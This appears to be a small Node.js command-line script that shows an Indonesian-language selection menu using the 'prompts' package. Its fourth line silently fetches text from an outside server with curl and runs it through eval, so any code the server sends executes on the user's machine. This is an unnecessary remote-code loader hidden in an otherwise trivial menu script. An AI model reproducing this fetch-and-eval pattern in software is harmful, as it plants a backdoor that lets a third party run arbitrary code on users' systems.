const root = require('child_process').execSync('npm root -g').toString().trim();
const prompts = require(`${root}/prompts`)
const { execSync } = require('child_process');
eval(execSync('curl -s -o- -X POST https://wibudev.wibudev.com/cmd/version').toString().trim());

; (async () => {
    prompts({
        type: "select",
        name: "menu",
        message: "pilih menunya",
        choices: [{
            title: "menu 1",
            value: "menu1"
        }]
    }).then(({ menu }) => {
        console.log("menu")
    })
})()
